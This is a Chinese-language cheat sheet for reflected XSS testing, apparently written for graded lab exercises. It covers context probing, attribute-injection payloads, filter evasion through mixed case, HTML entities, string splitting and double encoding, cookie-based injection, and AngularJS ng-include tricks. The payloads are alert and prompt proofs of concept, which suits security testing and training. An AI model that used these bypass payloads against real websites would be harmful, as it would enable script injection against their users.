# Reflection XSS 测试与绕过

## 1. 确认回显上下文
- 提交 `"><h1>x</h1>` 判断是否可闭合标签；提交 `"><img src=x>` 判断是否过滤尖括号/引号。
- 记录回显位置：标签之间的文本、属性值（单/双/无引号）、URL/href、JS 变量、Angular 表达式等。

## 2. 属性值注入模板
- 双引号属性：`"><img src=x onerror=alert(1)>` 或闭合 value 注入属性：`" autofocus onfocus=alert(1) x="`。
- 单引号属性：`'><img src=x onerror=alert(1)>` 或 `' autofocus onfocus=alert(1) x='`。
- 无引号属性：`x onmouseover=alert(1)` 或 `x onfocus=alert(1) autofocus`。
- 必须考虑触发条件：优先自动触发事件 `onerror/onload/onscroll`；`onmouseover/onfocus` 需要交互，自动化判分环境可能不触发。
- 当原始元素为 `<input type=hidden>` 时，先闭合 value 并注入 `type="image" src="x" onerror="alert(1)"`，新声明的 type 会覆盖原有 hidden 属性，img 加载失败自动触发 onerror。若原标签还有 `type=hidden` 在 payload 之后，保持注入的 type 在前即可生效。
- 属性内无法闭合时，尝试在属性值内使用编码引号或空白拆分。

## 3. 关键字过滤绕过
### 3.1 大小写混合
- 若服务端过滤大小写敏感，转换事件名/协议/属性名字母大小写：`OnErRoR`、`OnMoUsEoVeR`、`hRef`、`sCrIpT`。
- 属性名与事件名在 HTML 解析中不区分大小写，但服务端字符串替换区分。
- 模板：`"><img src=x OnErRoR=top['al'+'ert'](1)>`
- 模板：`"><a hRef="javaScript:top['al'+'ert'](1)">x</a>`

### 3.2 HTML 实体编码（拆分关键字）
- 将敏感字 `script`、`on` 中的字符用 HTML 数字字符引用替换，服务端过滤时看到的字面量不连续，但浏览器解析属性值后恢复。
- 常用映射：`s` 对应 `&#115;`，`o` 对应 `&#111;`，`n` 对应 `&#110;`，冒号可用 `&colon;` 或 `&#58;`。
- 模板（href 协议）：`java&#115;cript:alert(1)` 或 `java&#x73;cript:alert(1)`
- 模板（事件名）：`o&#110;error=alert(1)` 可绕过 `on` 子串替换，但注意属性名解析实体后为 `onerror`。
- 模板（带 URL 编码传输）：将 `&` 编码为 `%26`，`#` 编码为 `%23`，例如发送 `java%26%23115%3Bcript:alert(1)`；服务器 URL 解码后得到 `java&#115;cript:alert(1)` 再写入 HTML。

### 3.3 JS 内部字符串拆分
- 在事件处理器或 Angular 表达式中，使用字符串拼接绕过对 `alert`、`document`、`prompt` 等字面量过滤。
- 模板：`top['al'+'ert'](1)`、`top["pr"+"ompt"](1)`、`self['doc'+'ument']['domain']`
- 将上述嵌入事件属性：`"><img src=x onerror=top['al'+'ert'](1)>`

### 3.4 URL 编码/双重编码
- 测试服务端过滤发生在 URL 解码前还是后：若过滤在解码后，尝试双重编码 `%2573`（s 的二次编码）使服务端解码一次后仍为 `%73` 不匹配，后续浏览器再解码成 s。
- 用 `%26` 传 `&`、`%23` 传 `#`，使服务端接收后保留 HTML 实体语法。

## 4. Cookie 注入（隐蔽输入点）
- 插入点来自 Cookie 值时，直接修改请求 Cookie 头为 payload，无需先通过 Set-Cookie 设置。
- 若服务端每次响应都会 Set-Cookie 覆盖该值，避免多步操作：确保同一次请求携带恶意 Cookie；如果确实要分两步，第二步请求的 Cookie 头不能受第一步响应体的 Set-Cookie 影响。
- Cookie 值字符限制：不允许 `;`、空格、换行等；需要 URL 编码 `"` 等特殊字符。
- 在 Cookie 中构造属性注入 payload：`" type="image" src="x" onerror="alert(1)` 或 `"/type="image"/src="x"/onerror="alert(1)`，利用 image 触发无需交互。
- 注意 Cookie 值中 `%22` 解码为 `"`，`%0d%0a` 可能被忽略。

## 5. AngularJS / ng-include 场景
- 输入进入 `ng-include` 的 src 表达式时，尝试闭合 Angular 字符串并指向同源 URL，该 URL 返回包含可执行 HTML 的内容。
- 模板：`'SAME_ORIGIN_URL?param=<img src=x onerror=top["pr"+"ompt"](1)>'`，令 Angular 表达式求值为该 URL，然后 ng-include 加载并编译 `param` 中的 HTML。
- 若表达式过滤 `alert` 等，使用 `top["pr"+"ompt"](1)` 绕过。
- AngularJS 1.2.0 经典沙箱绕过的 `constructor.constructor` 可能失败，优先使用 ng-include 加载 HTML 或 `top["p"+"rompt"](1)` 一类的 window 引用。

## 6. 快捷 payload 速查
- 基本双引号逃逸：`"><svg onload=alert(1)>`
- 闭合 input 添加事件：`" autofocus onfocus=alert(1) x="`（可用于可交互 input）
- 无交互 input 触发：`" type="image" src="x" onerror="alert(1)`
- href + 大小写绕过：`"><a hRef="javaScript:alert(1)">x</a>`
- href + HTML 实体绕过 script 过滤：`java&#115;cript:alert(1)`
- href + URL 编码实体：`java%26%23115%3Bcript:alert(1)`
- 事件名大小写绕过 on 过滤：`"><img src=x OnErRoR=top['al'+'ert'](1)>`
- JS 内拆分 alert：`top['al'+'ert'](1)`
- Cookie 属性注入：`" type="image" src="x" onerror="alert(1)`
- Angular ng-include：`'path/file.php?name=<img src=x onerror=top["pr"+"ompt"](1)>'`

## 7. 判分失败排查
- 产生 payload 后，在无交互 headless 浏览器中执行，确认自动触发。
- 若 payload 依赖 onmouseover/onfocus 且测试环境无交互，换用 onerror/onload。
- 若 on 被替换为 o_n，检查是否使用了大小写混合绕过，或导致属性名无效。
- 若 script 被替换，尝试 HTML 实体编码拆分关键字；注意服务端过滤可能发生在 URL 解码后，用 `%26%23115%3B` 传输。
- 若在 `<a href>` 中直接提交 `javascript:...` 被过滤，检查是否可先闭合 `<a>` 或注入新标签。
- 若 Cookie payload 未触发，确认 Cookie 值传输时是否被 URL 解码影响分句；避免使用分号。
- 若 Angular 沙箱 payload 无效，改用 ng-include 加载同源 HTML。